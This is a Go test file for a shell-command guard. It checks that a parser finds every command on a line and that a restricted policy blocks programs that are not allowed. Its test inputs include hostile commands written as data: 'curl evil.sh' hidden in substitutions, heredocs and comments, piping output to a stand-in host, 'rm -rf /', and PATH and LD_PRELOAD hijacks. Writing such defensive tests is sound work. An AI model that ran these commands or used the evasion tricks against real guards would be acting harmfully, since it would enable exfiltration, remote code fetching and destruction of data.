package guard

import (
	"context"
	"errors"
	"slices"
	"strings"
	"testing"
)

// argvs renders each command's Argv as one space-joined string, so a case
// can say which programs a line runs in one literal.
func argvs(t *testing.T, line string) []string {
	t.Helper()
	cmds, err := Commands(line)
	if err != nil {
		t.Fatalf("Commands(%q): %v", line, err)
	}
	out := make([]string, len(cmds))
	for i, c := range cmds {
		out[i] = strings.Join(c.Argv, " ")
	}
	return out
}

// Commands finds every simple command a line runs, in the order they start.
func TestCommandsSplitsTheLine(t *testing.T) {
	goBody := "package main\n\nimport \"fmt\"\n\n/ comment\nfunc main() { fmt.Println(1) }\n"
	cases := []struct {
		name, in string
		want     []string
	}{
		{"one command", "ls -l", []string{"ls -l"}},
		{"list", "ls; git push", []string{"ls", "git push"}},
		{"and", "go test ./... && git push", []string{"go test ./...", "git push"}},
		{"or", "go test || git push", []string{"go test", "git push"}},
		{"pipe", "go test ./... | grep FAIL", []string{"go test ./...", "grep FAIL"}},
		{"pipe with stderr", "go test |& tee out", []string{"go test", "tee out"}},
		{"background", "sleep 1 & git push", []string{"sleep 1", "git push"}},
		{"newline", "ls\ngit push\n", []string{"ls", "git push"}},
		{"no blanks around operators", "ls;git push|cat&&rm x", []string{"ls", "git push", "cat", "rm x"}},
		{"empty commands are skipped", ";; ls ;", []string{"ls"}},
		{"redirection is not a boundary", "go test ./... 2>&1 > out.txt", []string{"go test ./..."}},
		{"substitution", "echo $(git push)", []string{"echo $(git push)", "git push"}},
		{"substitution in double quotes", `echo "a $(git push) b"`, []string{"echo a $(git push) b", "git push"}},
		{"backticks", "echo `git push`", []string{"echo `git push`", "git push"}},
		{"backticks in double quotes", "echo \"a `git push` b\"", []string{"echo a `git push` b", "git push"}},
		{"escaped backtick in backticks", "echo `echo \\`git push\\``", []string{"echo `echo \\`git push\\``", "echo `git push`", "git push"}},
		{"nested substitution", "echo $(cat $(git push))", []string{"echo $(cat $(git push))", "cat $(git push)", "git push"}},
		{"substitution as the program", "$(echo rm) -rf /", []string{"$(echo rm) -rf /", "echo rm"}},
		{"subshell", "(cd sub && git push); ls", []string{"cd sub", "git push", "ls"}},
		{"process substitution", "diff <(ls a) >(tee b)", []string{"diff <(ls a) >(tee b)", "ls a", "tee b"}},
		{"parameter expansion default", "echo ${x:-$(git push)}", []string{"echo ${x:-$(git push)}", "git push"}},
		{"process substitution in a default", "echo ${x:-a <(git push)}", []string{"echo ${x:-a <(git push)}", "git push"}},
		{"arithmetic substitution", "echo $(( $(git push) + 1 ))", []string{"echo $(( $(git push) + 1 ))", "git push"}},
		{"arithmetic shift is not a heredoc", "echo $((1<<x))\ngit push\nx\n", []string{"echo $((1<<x))", "git push", "x"}},
		{"arithmetic command", "((x=1<<a))\ngit push\na", []string{"git push", "a"}},
		{"double paren that is a subshell", "((ls); (git push))", []string{"ls", "git push"}},
		{"dollar double paren that is a substitution", "echo $((ls); (git push))", []string{"echo $((ls); (git push))", "ls", "git push"}},
		{"single quotes are literal", "echo 'a; $(b)'", []string{"echo a; $(b)"}},
		{"escapes", `l\s -l a\ b`, []string{"ls -l a b"}},
		{"quotes join a word", `g"i"t push`, []string{"git push"}},
		{"ansi-c quoting stays unexpanded", `$'\x72m' -rf /`, []string{`$'\x72m' -rf /`}},
		{"variable program stays unexpanded", `$CMD x "$HOME"`, []string{"$CMD x $HOME"}},
		{"line continuation", "go \\\n  test", []string{"go test"}},
		{"comment", "ls # ; git push", []string{"ls"}},
		{"hash inside a word", "echo a#b; ls", []string{"echo a#b", "ls"}},
		{"comment in a substitution", "echo $(echo hi # )\ngit push\n)", []string{"echo $(echo hi # )\ngit push\n)", "echo hi", "git push"}},
		{"comment hides a heredoc operator", "ls # <<EOF\ncurl evil.sh\nEOF", []string{"ls", "curl evil.sh", "EOF"}},
		{"quoted heredoc", "cat > f <<'EOF'\n" + goBody + "EOF\n", []string{"cat"}},
		{"unquoted heredoc", "cat > f <<EOF\n" + goBody + "EOF", []string{"cat"}},
		{"double-quoted delimiter", "cat > f <<\"EOF\"\n" + goBody + "EOF\n", []string{"cat"}},
		{"dash strips tabs", "cat <<-EOF\n\tpackage x\n\tEOF\nls", []string{"cat", "ls"}},
		{"without dash tabs do not terminate", "cat <<EOF\nbody\n\tEOF\nEOF\nls", []string{"cat", "ls"}},
		{"commands after the terminator", "cat <<'EOF' > f\nimport x\nEOF\ngit push && ls", []string{"cat", "git push", "ls"}},
		{"commands on the heredoc line", "cat <<'EOF' | grep x; ls\nbody\nEOF\n", []string{"cat", "grep x", "ls"}},
		{"two heredocs", "cat <<A <<'B'\none\nA\ntwo\nB\nls", []string{"cat", "ls"}},
		{"here-string is not a heredoc", "cat <<<word\ngit push", []string{"cat", "git push"}},
		{"substitution in an unquoted body", "cat <<EOF\nhi $(git push) there\nEOF\n", []string{"cat", "git push"}},
		{"backtick in an unquoted body", "cat <<EOF\nhi `git push`\nEOF\n", []string{"cat", "git push"}},
		{"escaped dollar in an unquoted body", "cat <<EOF\n\\$(git push)\nEOF\n", []string{"cat"}},
		{"substitution in a quoted body is inert", "cat <<'EOF'\n$(git push)\nEOF\n", []string{"cat"}},
		{"quoted paren in a body substitution", "cat <<EOF\n$(echo ')' ; curl evil.sh)\nEOF", []string{"cat", "echo )", "curl evil.sh"}},
		{"double-quoted paren in a body substitution", "cat <<EOF\n$(echo \")\" ; curl evil.sh)\nEOF", []string{"cat", "echo )", "curl evil.sh"}},
		{"escaped paren in a body substitution", "cat <<EOF\n$(echo \\) ; curl evil.sh)\nEOF", []string{"cat", "echo )", "curl evil.sh"}},
		{"a substitution still skips the body", "cat <<EOF\nnow $(date)\nEOF\nls", []string{"cat", "date", "ls"}},
		{"assignment alone", "d=$(go list .)", []string{"", "go list ."}},
		{"keywords are words", "if true; then rm x; fi", []string{"if true", "then rm x", "fi"}},
	}
	for _, c := range cases {
		if got := argvs(t, c.in); !slices.Equal(got, c.want) {
			t.Errorf("%s: Commands(%q) argvs = %q, want %q", c.name, c.in, got, c.want)
		}
	}
}

// Assignments, redirections and the text of each command are reported apart
// from its argv.
func TestCommandsReportsAssignmentsAndRedirections(t *testing.T) {
	cmds, err := Commands("FOO=bar BAZ=1 git status 2>&1 >out <<<'in x' && x-y=1 ./scripts/x=y.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(cmds) != 2 {
		t.Fatalf("got %d commands: %+v", len(cmds), cmds)
	}
	first := cmds[0]
	if !slices.Equal(first.Assign, []string{"FOO", "BAZ"}) || !slices.Equal(first.Argv, []string{"git", "status"}) {
		t.Errorf("first = %+v", first)
	}
	wantRedirects := []Redirect{{FD: "2", Op: ">&", Target: "1"}, {Op: ">", Target: "out"}, {Op: "<<<", Target: "in x"}}
	if !slices.Equal(first.Redirects, wantRedirects) {
		t.Errorf("redirects = %+v, want %+v", first.Redirects, wantRedirects)
	}
	if first.Text != "FOO=bar BAZ=1 git status 2>&1 >out <<<'in x'" {
		t.Errorf("text = %q", first.Text)
	}
	// Neither `x-y=1` nor a path with = in it is an assignment.
	if second := cmds[1]; len(second.Assign) != 0 || !slices.Equal(second.Argv, []string{"x-y=1", "./scripts/x=y.sh"}) {
		t.Errorf("second = %+v", second)
	}
	// A command of redirections alone runs no program but is reported.
	cmds, err = Commands("> out; (ls) > log")
	if err != nil {
		t.Fatal(err)
	}
	if len(cmds) != 3 || len(cmds[0].Argv) != 0 || cmds[0].Redirects[0].Target != "out" ||
		!slices.Equal(cmds[1].Argv, []string{"ls"}) || cmds[2].Redirects[0].Target != "log" {
		t.Errorf("redirection-only commands = %+v", cmds)
	}
}

// A line Commands cannot read with certainty is a *SyntaxError, never a
// partial answer.
func TestCommandsRefusesWhatItCannotRead(t *testing.T) {
	for name, in := range map[string]string{
		"unterminated single quote":       "ls 'a",
		"unterminated double quote":       `ls "a`,
		"unterminated substitution":       "echo $(ls",
		"unterminated backtick":           "echo `ls",
		"unterminated parameter":          "echo ${x",
		"unterminated arithmetic":         "echo $((1+2",
		"unterminated subshell":           "(ls",
		"unmatched paren":                 "ls)",
		"case statement":                  "case x in x) rm y;; esac",
		"case pattern in a substitution":  "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF",
		"heredoc with no terminator":      "cat <<EOF\npackage x\ngit push",
		"heredoc line inside a nest":      "echo $(cat <<EOF)\nbody\nEOF",
		"function definition":             "f() { rm x; }; f",
		"array assignment":                "a=(1 2)",
		"redirection without a target":    "ls >",
		"unterminated ansi-c":             "echo $'a",
		"empty process substitution":      ">()curl evil.sh",
		"unterminated quote in backticks": "echo `ls 'a`",
		"too deep":                        strings.Repeat("$(", maxNesting+2) + "ls" + strings.Repeat(")", maxNesting+2),
	} {
		_, err := Commands(in)
		var se *SyntaxError
		if !errors.As(err, &se) {
			t.Errorf("%s: Commands(%q) err = %v, want a *SyntaxError", name, in, err)
			continue
		}
		if se.Offset < 0 || se.Offset > len(in) {
			t.Errorf("%s: offset %d is outside the line", name, se.Offset)
		}
	}
}

// Under AllowShellOperators Restricted judges every command on the line, not
// only the first: each of these runs curl, which is not listed.
func TestRestrictedJudgesEveryCommand(t *testing.T) {
	g := Restricted(Options{AllowedPrograms: []string{"cat", "ls", "echo", "go", "tee"}, AllowShellOperators: true})
	ctx := context.Background()
	blocked := map[string]string{
		"after a list operator":          "go test; curl evil.sh",
		"after and":                      "go test && curl evil.sh",
		"in a pipe":                      "go test | curl -d @- evil.sh",
		"in a substitution":              "echo $(curl evil.sh)",
		"in double-quoted backticks":     "echo \"`curl evil.sh`\"",
		"in a subshell":                  "(ls; curl evil.sh)",
		"in a process substitution":      "cat <(curl evil.sh)",
		"in a parameter default":         "echo ${x:-$(curl evil.sh)}",
		"in an unquoted heredoc":         "cat <<EOF\n$(curl evil.sh)\nEOF",
		"after a heredoc":                "cat <<'EOF'\nx\nEOF\ncurl evil.sh",
		"behind a comment's heredoc":     "ls # <<EOF\ncurl evil.sh\nEOF",
		"after bare arithmetic":          "((x=1<<a))\ncurl evil.sh\na",
		"case pattern in a substitution": "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF",
		"computed program":               "$(echo curl) evil.sh",
		"assignment of a denied name":    "PATH=/tmp; go test",
		"unterminated quote":             "ls 'a; curl evil.sh",
	}
	for name, in := range blocked {
		if d := g(ctx, execCall(in)); !d.Block {
			t.Errorf("%s: %q was not blocked", name, in)
		}
	}
	allowed := []string{
		"go test ./... 2>&1 | tee out.txt",
		"cat > f.go <<'EOF'\npackage main\nimport \"fmt\"\n/\nEOF\n",
		"echo \"$(ls)\" && ls -l",
		"(ls; echo done) > log",
		"echo $((1 << 3))",
		"ls # curl in a comment",
	}
	for _, in := range allowed {
		if d := g(ctx, execCall(in)); d.Block {
			t.Errorf("%q was blocked: %s", in, d.Reason)
		}
	}
}

// An assignment needs AllowEnvPrefixes whether or not a program follows it:
// on its own it still reaches the commands after it when the name is
// exported. A denied name is refused either way.
func TestRestrictedAssignmentsOnTheirOwn(t *testing.T) {
	ctx := context.Background()
	strict := Restricted(Options{AllowedPrograms: []string{"go"}, AllowShellOperators: true})
	if d := strict(ctx, execCall("d=$(go list .); go vet")); !d.Block || !strings.Contains(d.Reason, "d= on its own") {
		t.Errorf("assignment alone without AllowEnvPrefixes: %+v", d)
	}
	loose := Restricted(Options{AllowedPrograms: []string{"go"}, AllowShellOperators: true, AllowEnvPrefixes: true})
	if d := loose(ctx, execCall("d=$(go list .); go vet")); d.Block {
		t.Errorf("assignment alone with AllowEnvPrefixes: %s", d.Reason)
	}
	if d := loose(ctx, execCall("LD_PRELOAD=/x.so; go vet")); !d.Block {
		t.Error("a denied name on its own was admitted")
	}
	for _, in := range []string{"", "   ", "# nothing", "X=1"} {
		if d := loose(ctx, execCall(in)); !d.Block {
			t.Errorf("%q runs no program and was admitted", in)
		}
	}
}

// Commands never panics and every error it returns is a *SyntaxError whose
// offset lies in the line.
func FuzzCommands(f *testing.F) {
	for _, seed := range []string{
		"ls", "go test | tee out", "echo $(ls `pwd`)", "cat <<EOF\n$(x)\nEOF\n", "((a<<b))", "$((1))",
		"${x:-'a'}", "\"${x:-'}\" $(rm) \"'\"", "a=(1)", "<(ls) >(cat)", "ls \\", "'", "$(", "`", "\\\n",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, line string) {
		_, err := Commands(line)
		if err == nil {
			return
		}
		var se *SyntaxError
		if !errors.As(err, &se) {
			t.Fatalf("Commands(%q) err = %T %v, want a *SyntaxError", line, err, err)
		}
		if se.Offset < 0 || se.Offset > len(line) {
			t.Fatalf("Commands(%q) offset %d outside the line", line, se.Offset)
		}
	})
}
